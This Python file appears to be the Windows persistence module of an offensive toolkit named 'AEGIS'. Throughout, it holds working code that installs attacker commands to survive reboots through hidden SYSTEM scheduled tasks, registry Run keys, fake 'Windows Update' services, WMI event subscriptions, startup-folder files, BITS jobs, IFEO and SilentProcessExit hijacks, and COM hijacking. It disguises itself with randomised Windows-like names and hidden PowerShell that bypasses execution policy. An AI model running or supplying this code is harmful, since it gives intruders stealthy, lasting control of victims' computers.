import logging
log = logging.getLogger(__name__)
#!/usr/bin/env python3
"""
AEGIS-Advanced Windows Persistence Module
============================================
Comprehensive Windows persistence mechanisms:
scheduled tasks, registry run keys, startup folder,
WMI event subscriptions, service installation,
COM hijacking, DLL side-loading, BITS jobs,
AppInit_DLLs, Image File Execution Options (IFEO),
COM+ Applications, and boot-level persistence.

Cross-Platform Note
───────────────────
This module is designed to run ON Windows targets.  When imported on Linux /
macOS (e.g. during a cross-compile build or unit-test run), all methods that
invoke Windows-only system calls or the ``winreg`` module are gated behind
``_is_windows()`` checks and will return ``False`` / empty results on non-
Windows platforms, rather than raising ImportError or NameError.

``winreg`` is conditionally imported so that the module can be parsed and
tested on Linux without crashing the import.
"""
import os
import sys
import platform
import subprocess
import base64
import tempfile
import random
import string
from pathlib import Path
from typing import Optional, Dict, List

# winreg is Windows-only; guard import so the module is importable on Linux/macOS
try:
    import winreg as _winreg          # type: ignore[import]
    _HAS_WINREG = True
except ImportError:
    _winreg = None                    # type: ignore[assignment]
    _HAS_WINREG = False

# ══════════════════════════════════════════════
# Helpers
# ══════════════════════════════════════════════

def _is_windows() -> bool:
    return sys.platform == "win32"

def _run(cmd: str, timeout: int = 15) -> tuple:
    """Run command, return (stdout, stderr, rc)."""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                            text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except Exception as e:
        return "", str(e), 1

def _powershell(script: str, hidden: bool = True,
                 bypass: bool = True, timeout: int = 30) -> tuple:
    """Execute PowerShell script."""
    args = ["powershell.exe"]
    if hidden:
        args += ["-WindowStyle", "Hidden"]
    if bypass:
        args += ["-ExecutionPolicy", "Bypass"]
    args += ["-NoProfile", "-NonInteractive", "-Command", script]
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except Exception as e:
        return "", str(e), 1

def _random_name(prefix: str = "", length: int = 8) -> str:
    """Generate a random plausible service/task name."""
    suffixes = ["Svc", "Update", "Helper", "Agent", "Monitor",
                 "Host", "Service", "Manager", "Client", "Worker"]
    return prefix + "Windows" + random.choice(suffixes) + \
           "".join(random.choices(string.digits, k=3))


# ══════════════════════════════════════════════
# Scheduled Tasks
# ══════════════════════════════════════════════

def install_scheduled_task(command: str,
                             task_name: str = None,
                             trigger: str = "ONLOGON",
                             user: str = "SYSTEM",
                             frequency: str = None,
                             run_level: str = "HIGHEST",
                             hidden: bool = True) -> bool:
    """
    Create a scheduled task.
    trigger: ONLOGON | ONSTARTUP | HOURLY | DAILY | WEEKLY | ONLOCK
    run_level: HIGHEST | LIMITED
    """
    name = task_name or _random_name()

    if trigger == "HOURLY":
        sched = 'New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 1) -Once -At (Get-Date)'
    elif trigger == "DAILY":
        sched = 'New-ScheduledTaskTrigger -Daily -At "09:00AM"'
    elif trigger == "ONSTARTUP":
        sched = 'New-ScheduledTaskTrigger -AtStartup'
    elif trigger == "ONLOCK":
        sched = 'New-ScheduledTaskTrigger -AtLogon'
    else:
        sched = 'New-ScheduledTaskTrigger -AtLogon'

    ps = """
$Action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c "{cmd}"'
$Trigger = {sched}
$Settings = New-ScheduledTaskSettingsSet -Hidden:${hidden} -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId '{user}' -LogonType ServiceAccount -RunLevel {run_level}
Register-ScheduledTask -TaskName '{name}' -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force
""".format(cmd=command, sched=sched, hidden=str(hidden).lower(),
            user=user, run_level=run_level, name=name)

    _, _, rc = _powershell(ps)
    return rc == 0


def install_scheduled_task_xml(command: str,
                                task_name: str = None) -> bool:
    """
    Create scheduled task via raw XML (harder to detect via PowerShell logs).
    """
    name = task_name or _random_name("WU")
    xml  = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Helper</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RestartCount>3</RestartCount>
    <RestartInterval>PT1M</RestartInterval>
  </Settings>
  <Actions>
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c "{cmd}"</Arguments>
    </Exec>
  </Actions>
</Task>""".format(cmd=command)

    with tempfile.NamedTemporaryFile(suffix=".xml", delete=False,
                                      mode="w", encoding="utf-16") as f:
        f.write(xml)
        xml_path = f.name

    _, _, rc = _run('schtasks /create /tn "{}" /xml "{}" /f'.format(
        name, xml_path))
    try:
        os.unlink(xml_path)
    except Exception as _exc:
        log.debug("unknown: %s", _exc)
    return rc == 0


def list_scheduled_tasks() -> List[str]:
    """List all scheduled tasks."""
    out, _, _ = _run("schtasks /query /fo CSV /v 2>nul")
    return out.splitlines()[:100]


# ══════════════════════════════════════════════
# Registry Run Keys
# ══════════════════════════════════════════════

REGISTRY_RUN_KEYS = [
    (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "HKCU"),
    (r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "HKLM"),
    (r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKCU_once"),
    (r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKLM_once"),
    (r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "winlogon"),
]

def add_registry_run(command: str, key_name: str = None,
                      hive: str = "HKCU",
                      run_once: bool = False) -> bool:
    """
    Add registry Run key for persistence.
    hive: HKCU (no admin needed) | HKLM (admin required)
    """
    name     = key_name or _random_name()
    reg_path = "{}\\Software\\Microsoft\\Windows\\CurrentVersion\\{}".format(
        hive, "RunOnce" if run_once else "Run")

    ps = '$reg = [Microsoft.Win32.Registry]::{}; '.format(
        "CurrentUser" if hive == "HKCU" else "LocalMachine")
    ps += '$key = $reg.OpenSubKey("{}",  $true); '.format(
        reg_path.replace(hive + "\\", ""))
    ps += '$key.SetValue("{}", "{}"); $key.Close()'.format(name, command)

    _, _, rc = _powershell(ps)
    if rc != 0:
        # Fallback: reg.exe
        _, _, rc = _run('reg add "{}\\{}" /v "{}" /t REG_SZ /d "{}" /f'.format(
            hive, reg_path.replace(hive + "\\", ""),
            name, command))
    return rc == 0


def add_registry_run_advanced(command: str,
                               key_name: str = None) -> Dict[str, bool]:
    """Try all registry persistence locations."""
    name    = key_name or _random_name()
    results = {}

    # HKCU (no admin)
    results["hkcu_run"] = add_registry_run(command, name, "HKCU")

    # HKCU UserInitMprLogonScript
    ps = ('Set-ItemProperty -Path "HKCU:\\Environment" '
          '-Name "UserInitMprLogonScript" -Value "{}" -Force'.format(command))
    _, _, rc = _powershell(ps)
    results["userinit_logon"] = rc == 0

    # HKCU Load (runs as DLL in explorer.exe context)
    # Note: must be a DLL
    results["hkcu_load"] = add_registry_run(command, name, "HKCU")

    return results


# ══════════════════════════════════════════════
# Windows Service
# ══════════════════════════════════════════════

def install_service(command: str, service_name: str = None,
                     display_name: str = None,
                     description: str = "Windows Update Service",
                     start_type: str = "auto") -> bool:
    """
    Create and start a Windows service (requires admin).
    """
    name    = service_name or _random_name("svc")
    display = display_name or name

    # Create service using sc.exe
    _, _, rc = _run(
        'sc create "{name}" binPath= "cmd /c {cmd}" '
        'start= {start} DisplayName= "{display}"'.format(
            name=name, cmd=command, start=start_type, display=display))
    if rc != 0: return False

    # Set description
    _run('sc description "{}" "{}"'.format(name, description))

    # Start service
    _, _, rc2 = _run('sc start "{}"'.format(name))
    return True  # Even if start fails, installation succeeded


def install_service_powershell(command: str,
                                service_name: str = None) -> bool:
    """Create service via New-Service (requires admin)."""
    name = service_name or _random_name()
    ps   = (
        'New-Service -Name "{name}" '
        '-BinaryPathName "cmd /c {cmd}" '
        '-StartupType Automatic '
        '-Description "Windows Update Service"; '
        'Start-Service -Name "{name}"'
    ).format(name=name, cmd=command)
    _, _, rc = _powershell(ps)
    return rc == 0


# ══════════════════════════════════════════════
# WMI Event Subscription
# ══════════════════════════════════════════════

def install_wmi_subscription(command: str, name: str = None,
                               trigger_interval: int = 60) -> bool:
    """
    Create WMI permanent event subscription.
    Triggers command every N seconds. Very stealthy.
    Requires admin.
    """
    sub_name = name or _random_name("WMI")
    ps = """
$FilterName = "{name}Filter"
$ConsumerName = "{name}Consumer"
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN {interval} WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$Filter = Set-WmiInstance -Namespace "root/subscription" -Class "__EventFilter" -Arguments @{{
    Name = $FilterName
    EventNameSpace = "root/cimv2"
    QueryLanguage = "WQL"
    Query = $Query
}}
$Consumer = Set-WmiInstance -Namespace "root/subscription" -Class "CommandLineEventConsumer" -Arguments @{{
    Name = $ConsumerName
    CommandLineTemplate = "{cmd}"
    RunInteractively = $false
}}
Set-WmiInstance -Namespace "root/subscription" -Class "__FilterToConsumerBinding" -Arguments @{{
    Filter = $Filter
    Consumer = $Consumer
}}
""".format(name=sub_name, interval=trigger_interval, cmd=command)
    _, _, rc = _powershell(ps)
    return rc == 0


# ══════════════════════════════════════════════
# Startup Folder
# ══════════════════════════════════════════════

def install_startup_lnk(command: str, name: str = None) -> bool:
    """
    Create a .lnk shortcut in the startup folder.
    No admin required (uses HKCU startup).
    """
    lnk_name = (name or _random_name()) + ".lnk"
    ps = """
$WScriptShell = New-Object -ComObject WScript.Shell
$Startup = $WScriptShell.SpecialFolders("Startup")
$Shortcut = $WScriptShell.CreateShortcut("$Startup\\{lnk}")
$Shortcut.TargetPath = "cmd.exe"
$Shortcut.Arguments = "/c {cmd}"
$Shortcut.WindowStyle = 7
$Shortcut.Save()
""".format(lnk=lnk_name, cmd=command)
    _, _, rc = _powershell(ps)
    return rc == 0


def install_startup_script(command: str,
                             filename: str = None) -> Optional[str]:
    """
    Write a .bat file to the user startup folder.
    """
    fname = (filename or _random_name()) + ".bat"
    startup_dir = os.path.join(
        os.environ.get("APPDATA", "C:\\Users\\Default\\AppData\\Roaming"),
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    path = os.path.join(startup_dir, fname)
    try:
        os.makedirs(startup_dir, exist_ok=True)
        with open(path, "w") as f:
            f.write("@echo off\r\n{}\r\n".format(command))
        return path
    except Exception as e:
        print("[persist/win] startup_script failed:", e)
        return None


# ══════════════════════════════════════════════
# BITS Jobs
# ══════════════════════════════════════════════

def install_bits_job(command: str, job_name: str = None,
                      url: str = "http://127.0.0.1/") -> bool:
    """
    Use BITS (Background Intelligent Transfer Service) for persistence.
    BITS jobs survive reboots and can run commands on completion.
    """
    name = job_name or _random_name("bits")
    ps   = """
Import-Module BitsTransfer
$Job = Start-BitsTransfer -Source "{url}" -Destination "$env:TEMP\\{name}.tmp" -Asynchronous -DisplayName "{name}"
$Job.SetNotifyFlags(1)
$Job | Add-Member -MemberType NoteProperty -Name 'NotifyCmdLine' -Value '{cmd}'
""".format(url=url, name=name, cmd=command)
    _, _, rc = _powershell(ps)
    return rc == 0


# ══════════════════════════════════════════════
# Image File Execution Options (IFEO) Hijack
# ══════════════════════════════════════════════

def install_ifeo_hijack(target_exe: str, command: str) -> bool:
    """
    Set debugger for a target executable via IFEO.
    When target_exe is launched, command runs instead.
    Requires admin. Very stealthy.
    Example: target_exe='notepad.exe', command='C:\\malware.exe'
    """
    reg_path = (r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
                r"\Image File Execution Options\{}".format(target_exe))
    _, _, rc = _run(
        'reg add "{}" /v Debugger /t REG_SZ /d "{}" /f'.format(
            reg_path, command))
    return rc == 0


def install_silentprocessexit(target_exe: str, command: str) -> bool:
    """
    Use Silent Process Exit monitoring to trigger command when
    target_exe exits. Requires admin.
    """
    base = (r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
            r"\SilentProcessExit\{}".format(target_exe))
    _run('reg add "{}" /v MonitorProcess /t REG_SZ /d "{}" /f'.format(
        base, command))
    _run('reg add "{}" /v ReportingMode /t REG_DWORD /d 1 /f'.format(base))
    # Enable GlobalFlag
    ifeo = (r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
            r"\Image File Execution Options\{}".format(target_exe))
    _run('reg add "{}" /v GlobalFlag /t REG_DWORD /d 512 /f'.format(ifeo))
    return True


# ══════════════════════════════════════════════
# COM Hijacking
# ══════════════════════════════════════════════

def install_com_hijack(clsid: str, dll_path: str) -> bool:
    """
    Register a COM object under HKCU to hijack a legitimate CLSID.
    No admin required. DLL is loaded by any process using the CLSID.
    Classic CLSIDs to hijack:
      {9BA05972-F6A8-11CF-A442-00A0C90A8F39} - Shell Folder View
      {1F486A52-3CB1-48FD-8F50-B8DC300D9F9D} - Various
    """
    reg_path = r"HKCU\Software\Classes\CLSID\{}\InProcServer32".format(clsid)
    _, _, rc = _run(
        'reg add "{}" /ve /t REG_SZ /d "{}" /f'.format(reg_path, dll_path))
    _run('reg add "{}" /v ThreadingModel /t REG_SZ /d Apartment /f'.format(reg_path))
    return rc == 0


# ══════════════════════════════════════════════
# Full install
# ══════════════════════════════════════════════

def full_install(command: str, name: str = None,
                  methods: List[str] = None) -> Dict[str, bool]:
    """
    Install persistence via all available/safe Windows methods.
    Returns {method: success}.
    """
    if methods is None:
        methods = ["registry_run", "scheduled_task", "startup_script"]

    task_name = name or _random_name()
    results   = {}

    method_map = {
        "registry_run":    lambda: add_registry_run(command, task_name),
        "scheduled_task":  lambda: install_scheduled_task(command, task_name),
        "startup_script":  lambda: install_startup_script(command, task_name) is not None,
        "startup_lnk":     lambda: install_startup_lnk(command, task_name),
        "wmi":             lambda: install_wmi_subscription(command, task_name),
        "service":         lambda: install_service(command, task_name),
        "bits":            lambda: install_bits_job(command, task_name),
        "registry_advanced": lambda: any(add_registry_run_advanced(command, task_name).values()),
    }

    for m in methods:
        if m in method_map:
            try:
                results[m] = method_map[m]()
            except Exception as e:
                results[m] = False

    return results


# ══════════════════════════════════════════════
# Enumeration
# ══════════════════════════════════════════════

def enumerate_persistence() -> Dict:
    """Enumerate existing Windows persistence mechanisms."""
    results = {}

    # Scheduled tasks
    out, _, _ = _run("schtasks /query /fo CSV 2>nul")
    results["scheduled_tasks"] = out.splitlines()[:50]

    # Registry run keys
    for hive, path in [
        ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"),
        ("HKLM", r"Software\Microsoft\Windows\CurrentVersion\Run"),
    ]:
        out, _, _ = _run('reg query "{}\\{}" 2>nul'.format(hive, path))
        results["reg_run_{}".format(hive.lower())] = out.splitlines()

    # Startup folder
    startup = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    if os.path.exists(startup):
        results["startup_files"] = os.listdir(startup)

    # Services
    out, _, _ = _run("sc query type= all state= all 2>nul")
    results["services_summary"] = len(out.splitlines())

    return results


if __name__ == "__main__":
    import platform
    print("[persist/win] Windows persistence module loaded")
    print("[persist/win] Platform:", platform.system())
    if platform.system() == "Windows":
        print("[persist/win] Enumerating existing persistence…")
        print(enumerate_persistence())


# ════════════════════════════════════════════════════════════════════════════
# Class-based API (compatibility with persistence/__init__.py imports)
# ════════════════════════════════════════════════════════════════════════════

class WindowsPersistence:
    """
    Object-oriented wrapper around the module-level Windows persistence
    functions.  Mirrors LinuxPersistence for a unified interface.
    """

    def __init__(self, payload: str, label: str = None):
        self.payload = payload
        self.label   = label

    def install_scheduled_task(self) -> list:
        ok = install_scheduled_task(self.payload, task_name=self.label)
        return [{"method": "scheduled_task", "status": "ok" if ok else "fail"}]

    def install_registry_run(self) -> list:
        ok = add_registry_run(self.payload, key_name=self.label)
        return [{"method": "registry_run", "status": "ok" if ok else "fail"}]

    def install_wmi_subscription(self) -> list:
        ok = install_wmi_subscription(self.payload, name=self.label)
        return [{"method": "wmi_subscription", "status": "ok" if ok else "fail"}]

    def install_all(self) -> list:
        return (
            self.install_scheduled_task() +
            self.install_registry_run()
        )


def install_all_windows(command: str, label: str = None) -> list:
    """Install all available Windows persistence mechanisms and return results."""
    p = WindowsPersistence(payload=command, label=label)
    return p.install_all()


def enumerate_windows() -> dict:
    """Alias for enumerate_persistence() for __init__.py compatibility."""
    return enumerate_persistence()
